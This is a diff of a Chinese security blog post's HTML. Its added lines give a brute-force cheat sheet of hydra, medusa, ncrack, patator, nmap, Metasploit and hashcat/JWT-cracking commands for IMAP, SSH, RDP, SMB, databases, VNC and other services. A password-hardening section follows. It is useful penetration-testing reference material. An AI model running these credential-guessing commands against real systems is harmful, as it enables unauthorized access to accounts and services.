+<h3 id="9-IMAP"><a href="#9-IMAP" class="headerlink" title="9. IMAP"></a>9. IMAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l USERNAME -P /path/to/passwords.txt -f &lt;IP&gt; imap -V</span><br><span class="line">hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f &lt;IP&gt; imap -V</span><br><span class="line">nmap -sV --script imap-brute -p &lt;PORT&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-IRC"><a href="#10-IRC" class="headerlink" title="10. IRC"></a>10. IRC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p &lt;PORT&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-JWT"><a href="#11-JWT" class="headerlink" title="11. JWT"></a>11. JWT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#hashcat</span><br><span class="line">hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt</span><br><span class="line"></span><br><span class="line">#https://github.com/Sjord/jwtcrack</span><br><span class="line">python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">#John</span><br><span class="line">john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256</span><br><span class="line"></span><br><span class="line">#https://github.com/ticarpi/jwt_tool</span><br><span class="line">python3 jwt_tool.py -d wordlists.txt &lt;JWT token&gt;</span><br><span class="line"></span><br><span class="line">#https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8</span><br><span class="line"></span><br><span class="line">#https://github.com/mazen160/jwt-pwn</span><br><span class="line">python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt</span><br><span class="line"></span><br><span class="line">#https://github.com/lmammino/jwt-cracker</span><br><span class="line">jwt-cracker &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ&quot; &quot;abcdefghijklmnopqrstuwxyz&quot; 6</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-LDAP"><a href="#12-LDAP" class="headerlink" title="12. LDAP"></a>12. LDAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ldap-brute -p 389 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-Mongo"><a href="#13-Mongo" class="headerlink" title="13. Mongo"></a>13. Mongo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;</span><br><span class="line">use auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></table></figure>
+
+<h3 id="14-MySQL"><a href="#14-MySQL" class="headerlink" title="14. MySQL"></a>14. MySQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># hydra</span><br><span class="line">hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql</span><br><span class="line"></span><br><span class="line"># msfconsole</span><br><span class="line">msf&gt; use auxiliary/scanner/mysql/mysql_login; set VERBOSE false</span><br><span class="line"></span><br><span class="line"># medusa</span><br><span class="line">medusa -h &lt;IP/Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql</span><br></pre></td></tr></table></figure>
+
+<h3 id="15-PostgreSQL"><a href="#15-PostgreSQL" class="headerlink" title="15. PostgreSQL"></a>15. PostgreSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt; postgres</span><br><span class="line">medusa -h &lt;IP&gt; –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres</span><br><span class="line">ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt &lt;IP&gt;:5432</span><br><span class="line">patator pgsql_login host=&lt;IP&gt; user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="16-RDP"><a href="#16-RDP" class="headerlink" title="16. RDP"></a>16. RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp://&lt;IP&gt;</span><br><span class="line">hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp://&lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="17-Redis"><a href="#17-Redis" class="headerlink" title="17. Redis"></a>17. Redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/redis/redis_login</span><br><span class="line">nmap --script redis-brute -p 6379 &lt;IP&gt;</span><br><span class="line">hydra –P /path/pass.txt redis://&lt;IP&gt;:&lt;PORT&gt; # 6379 is the default</span><br></pre></td></tr></table></figure>
+
+<h3 id="18-Rexec"><a href="#18-Rexec" class="headerlink" title="18. Rexec"></a>18. Rexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rexec://&lt;Victim-IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+
+<h3 id="19-Rlogin"><a href="#19-Rlogin" class="headerlink" title="19. Rlogin"></a>19. Rlogin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;password_file&gt; rlogin://&lt;Victim-IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+
+<h3 id="20-Rsh"><a href="#20-Rsh" class="headerlink" title="20. Rsh"></a>20. Rsh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;Username_list&gt; rsh://&lt;Victim_IP&gt; -v -V</span><br></pre></td></tr></table></figure>
+
+<h3 id="21-Rsync"><a href="#21-Rsync" class="headerlink" title="21. Rsync"></a>21. Rsync</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="22-SMB"><a href="#22-SMB" class="headerlink" title="22. SMB"></a>22. SMB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-brute -p 445 &lt;IP&gt;</span><br><span class="line">hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="23-Socks"><a href="#23-Socks" class="headerlink" title="23. Socks"></a>23. Socks</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 &lt;IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="24-SSH"><a href="#24-SSH" class="headerlink" title="24. SSH"></a>24. SSH</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; ssh</span><br><span class="line">ncrack -p 22 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M ssh</span><br><span class="line">patator ssh_login host=&lt;ip&gt; port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg=&#x27;Authentication failed&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="25-Telnet"><a href="#25-Telnet" class="headerlink" title="25. Telnet"></a>25. Telnet</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P passwords.txt [-t 32] &lt;IP&gt; telnet</span><br><span class="line">ncrack -p 23 --user root -P passwords.txt &lt;IP&gt; [-T 5]</span><br><span class="line">medusa -u root -P 500-worst-passwords.txt -h &lt;IP&gt; -M telnet</span><br></pre></td></tr></table></figure>
+
+<h3 id="26-VNC"><a href="#26-VNC" class="headerlink" title="26. VNC"></a>26. VNC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s &lt;PORT&gt; &lt;IP&gt; vnc</span><br><span class="line">medusa -h &lt;IP&gt; –u root -P /root/Desktop/pass.txt –M vnc</span><br><span class="line">ncrack -V --user root -P /root/Desktop/pass.txt &lt;IP&gt;:&gt;POR&gt;T</span><br><span class="line">patator vnc_login host=&lt;IP&gt; password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!=&#x27;Authentication failure&#x27; --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">#Metasploit</span><br><span class="line">use auxiliary/scanner/vnc/vnc_login</span><br><span class="line">set RHOSTS &lt;ip&gt;</span><br><span class="line">set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst</span><br></pre></td></tr></table></figure>
+
 <h2 id="0x04-防御加固"><a href="#0x04-防御加固" class="headerlink" title="0x04 防御加固"></a>0x04 防御加固</h2><h3 id="1-缺陷总结"><a href="#1-缺陷总结" class="headerlink" title="1. 缺陷总结"></a>1. 缺陷总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(1) 公共弱口令，出现频率比较高的弱口令</span><br><span class="line"></span><br><span class="line">(2) 数字或字母连排或混排，键盘字母连排</span><br><span class="line"></span><br><span class="line">(3) 默认密码，网络设备、系统组件等默认初始化弱口令</span><br><span class="line"></span><br><span class="line">(4) 生日，姓名+生日（利用社工非常容易被破解）</span><br><span class="line"></span><br><span class="line">(5) 短语密码（如：5201314，love1314等）</span><br></pre></td></tr></table></figure>
 
 <h3 id="2-口令设置"><a href="#2-口令设置" class="headerlink" title="2. 口令设置"></a>2. 口令设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令</span><br><span class="line"></span><br><span class="line">（2）口令长度不小于8 个字符</span><br><span class="line"></span><br><span class="line">（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）</span><br><span class="line"></span><br><span class="line">（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符</span><br><span class="line"></span><br><span class="line">（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词</span><br><span class="line"></span><br><span class="line">（6）口令不应该为用数字或符号代替某些字母的单词</span><br><span class="line"></span><br><span class="line">（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入</span><br><span class="line"></span><br><span class="line">（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -1190,6 +828,8 @@
 <li><p><a target="_blank" rel="noopener" href="https://nmap.org/ncrack/man.html">https://nmap.org/ncrack/man.html</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.openwall.com/john/doc/">https://www.openwall.com/john/doc/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force">https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/">https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/</a></p>
 </li>
@@ -1211,7 +851,7 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Vulner/" rel="tag" <i class="fa fa-tag"></i> Vulner</a>
+              <a href="/tags/Vulnerability/" rel="tag" <i class="fa fa-tag"></i> Vulnerability</a>
               <a href="/tags/Brute-force/" rel="tag" <i class="fa fa-tag"></i> Brute-force</a>
               <a href="/tags/Init-Access/" rel="tag" <i class="fa fa-tag"></i> Init Access</a>
           </div>
@@ -1220,8 +860,8 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/10024/" rel="prev" title="Linux入侵排查基础篇">
-                  <i class="fa fa-chevron-left"></i> Linux入侵排查基础篇
+                <a href="/posts/10024/" rel="prev" title="Linux入侵排查手册">
+                  <i class="fa fa-chevron-left"></i> Linux入侵排查手册
                 </a>
             </div>
             <div class="post-nav-item">
